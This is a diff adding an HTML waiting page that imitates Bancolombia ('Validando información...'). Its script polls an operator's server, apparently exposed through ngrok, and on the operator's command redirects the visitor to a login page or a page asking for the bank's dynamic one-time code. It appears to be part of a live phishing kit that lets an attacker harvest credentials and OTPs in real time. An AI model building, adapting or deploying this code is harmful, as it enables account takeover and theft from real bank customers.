@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Procesando...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+            text-align: center;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #FDDA24; /* Color Bancolombia */
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 { color: #333; }
+        p { color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="loader"></div>
+    <h2>Validando información...</h2>
+    <p>Por favor espere un momento, no cierre esta ventana.</p>
+
+    <script>
+        // CONFIGURACIÓN
+        // Si usas Ngrok, cambia esto por tu URL de Ngrok, ej: 'https://xxxx.ngrok-free.app'
+        // Si es local, usa localhost:3000
+        const SERVER_URL = 'http://localhost:3001'; 
+
+        async function checkStatus() {
+            try {
+                const response = await fetch(`${SERVER_URL}/check-status`);
+                const data = await response.json();
+
+                console.log("Estado:", data.command);
+
+                if (data.command) {
+                    handleCommand(data.command);
+                }
+            } catch (error) {
+                console.error("Esperando servidor...", error);
+            }
+        }
+
+        function handleCommand(command) {
+            const t = new Date().getTime();
+            
+            // Visual feedback
+            const h2 = document.querySelector('h2');
+            if (h2) h2.textContent = "Procesando: " + command;
+
+            setTimeout(() => {
+                switch(command) {
+                    case 'ask_logo':
+                        window.location.replace('index.html?t=' + t);
+                        break;
+                    case 'error_logo':
+                        window.location.replace('index.html?error=true&t=' + t);
+                        break;
+                    case 'ask_otp':
+                        window.location.replace('Dinamica.html?t=' + t);
+                        break;
+                    case 'error_dinamica':
+                        window.location.replace('Dinamica.html?error=true&t=' + t);
+                        break;
+                    default:
+                        console.log("Comando desconocido:", command);
+                }
+            }, 500);
+        }
+
+        // Consultar cada 2 segundos
+        setInterval(checkStatus, 2000);
+    </script>
+</body>
+</html>
